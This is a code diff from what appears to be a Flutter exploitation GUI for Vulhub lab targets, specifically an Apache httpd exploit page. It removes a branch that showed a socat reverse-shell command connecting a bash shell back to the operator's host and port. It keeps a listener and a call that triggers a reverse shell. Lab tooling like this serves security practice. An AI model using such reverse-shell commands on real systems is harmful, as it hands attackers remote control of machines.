@@ -151,34 +151,12 @@ class _HttpdPageState extends BaseVulhubExpPageState<HttpdExpPage> {
     try {
       await _rs.startListening(port: lport);
 
-      if (mode == 'socat') {
-        final cmd =
-            "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lhost:$lport";
-        appendLog(S.expLogSocatRunOnTarget);
-        appendLog(cmd);
-        if (mounted) {
-          await showDialog<void>(
-            context: context,
-            builder: (_) => AlertDialog(
-              title: Text(S.titleSocatCommand),
-              content: SelectableText(cmd),
-              actions: [
-                TextButton(
-                  onPressed: () => Navigator.of(context).pop(),
-                  child: Text(S.btnClose),
-                ),
-              ],
-            ),
-          );
-        }
-      } else {
-        final ok = await _svc().startReverseShell(
-          lhost,
-          lport,
-          preferScript: mode == 'script',
-        );
-        appendLog(ok ? S.expLogReverseSentWaiting : S.expLogSendFailed);
-      }
+      final ok = await _svc().startReverseShell(
+        lhost,
+        lport,
+        preferScript: mode == 'script',
+      );
+      appendLog(ok ? S.expLogReverseSentWaiting : S.expLogSendFailed);
     } catch (e) {
       appendLog(S.expLogStartFailed(e));
     } finally {
